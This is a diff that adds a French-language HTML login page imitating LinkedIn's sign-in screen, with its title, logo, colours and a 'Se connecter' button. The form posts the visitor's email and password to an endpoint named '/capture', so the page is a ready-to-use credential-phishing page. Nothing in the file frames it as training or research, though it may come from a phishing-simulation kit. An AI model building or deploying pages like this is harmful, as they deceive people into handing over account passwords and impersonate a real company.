@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn - Connexion</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f3f2ef;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 0 0 1px rgba(0,0,0,0.05);
+            max-width: 400px;
+            width: 100%;
+            padding: 40px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo h1 {
+            color: #0a66c2;
+            font-size: 32px;
+            margin: 0;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 400;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #00000014;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0a66c2;
+            box-shadow: 0 0 0 1px #0a66c2;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #0a66c2;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #004182;
+        }
+        .forgot {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .forgot a {
+            color: #0a66c2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .separator {
+            text-align: center;
+            margin: 25px 0;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>in</h1>
+        </div>
+        <h2>Connectez-vous</h2>
+        <p class="subtitle">Restez au courant des actualités de votre secteur</p>
+        
+        <form action="/capture" method="POST">
+            <div class="form-group">
+                <input type="email" name="email" placeholder="Email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Mot de passe" required>
+            </div>
+            <button type="submit" class="btn">Se connecter</button>
+        </form>
+        
+        <div class="forgot">
+            <a href="#">Mot de passe oublié ?</a>
+        </div>
+        
+        <div class="separator">___________________</div>
+        
+        <div class="forgot">
+            <span>Vous n'avez pas de compte ? <a href="#">S'inscrire</a></span>
+        </div>
+    </div>
+</body>
+</html>
+
